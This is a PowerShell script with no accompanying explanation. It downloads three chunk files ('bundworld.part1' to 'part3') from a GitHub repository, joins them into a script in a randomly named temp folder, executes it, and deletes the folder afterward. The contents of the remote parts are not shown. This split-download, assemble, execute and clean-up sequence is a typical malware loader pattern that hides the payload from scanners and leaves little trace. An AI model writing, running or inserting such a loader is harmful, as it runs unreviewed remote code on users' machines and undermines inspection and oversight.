# URLs of the 3 parts (must be raw/direct download links)
$urls = @(
    "https://github.com/JackAndJillContent/worldofbundbexi/raw/refs/heads/main/bundworld.part1",
    "https://github.com/JackAndJillContent/worldofbundbexi/raw/refs/heads/main/bundworld.part2",
    "https://github.com/JackAndJillContent/worldofbundbexi/raw/refs/heads/main/bundworld.part3"
)

$workDir  = Join-Path $env:TEMP ("asm_" + [guid]::NewGuid().ToString("N"))
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

$outFile = Join-Path $workDir "combined.ps1"

try {
    # Download all parts in parallel
    $jobs = foreach ($u in $urls) {
        Start-Job -ScriptBlock {
            param($url, $dir)
            $name = [System.IO.Path]::GetFileName(([uri]$url).AbsolutePath)
            if (-not $name) { $name = [guid]::NewGuid().ToString() }
            $dest = Join-Path $dir $name
            Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
            $dest
        } -ArgumentList $u, $workDir
    }

    $parts = $jobs | Wait-Job | Receive-Job
    $jobs  | Remove-Job -Force

    # Verify we got everything
    foreach ($p in $parts) {
        if (-not (Test-Path $p)) { throw "Missing part: $p" }
    }

    # Concatenate in the SAME order as $urls
    $out = [System.IO.File]::Create($outFile)
    try {
        foreach ($u in $urls) {
            $name = [System.IO.Path]::GetFileName(([uri]$u).AbsolutePath)
            $p    = Join-Path $workDir $name
            $in   = [System.IO.File]::OpenRead($p)
            try { $in.CopyTo($out) } finally { $in.Dispose() }
        }
    } finally { $out.Dispose() }

    Write-Host "Assembled -> $outFile ($((Get-Item $outFile).Length) bytes)"

    # Execute the combined script
    & $outFile
}
finally {
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
}